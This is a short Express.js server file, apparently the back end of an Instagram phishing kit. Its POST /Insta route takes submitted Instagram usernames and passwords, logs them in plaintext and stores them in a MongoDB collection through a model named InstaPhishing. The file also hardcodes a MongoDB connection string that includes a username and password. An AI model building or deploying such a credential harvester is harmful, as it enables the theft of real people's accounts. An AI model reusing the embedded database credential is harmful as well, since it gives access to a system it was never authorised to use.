import express from 'express';
import cors from 'cors';
import mongoose from 'mongoose';
import { instadb } from './models/InstaPhishing.js';

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());              // Allow all CORS requests
app.use(express.json());      // Parse JSON bodies

// MongoDB connection (update URI if needed)
mongoose.connect(process.env.MONGO_URI || 'mongodb+srv://hariomsingh4274:FJFZiGBqhAZRv3SR@cluster0.vlrs0o5.mongodb.net/Base?retryWrites=true&w=majority&appName=Cluster0', {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => {
  console.log("MongoDB connected");
}).catch((err) => {
  console.error("MongoDB connection error:", err);
});

// Default route
app.get('/', (req, res) => {
  res.json("Hello from Service");
});

// Route to handle Instagram credentials
app.post('/Insta', async (req, res) => {
  try {
    const { username, password } = req.body;
    console.log(`Received -> Username: ${username}, Password: ${password}`);

    const dataSave = new instadb({
      username: username,
      Password: password
    });

    await dataSave.save();
    res.json({ status: "true" });
  } catch (error) {
    console.error("Error saving data:", error);
    res.status(500).json({ status: "false", error: "Internal Server Error" });
  }
});

// Export app for Vercel deployment
export default app;
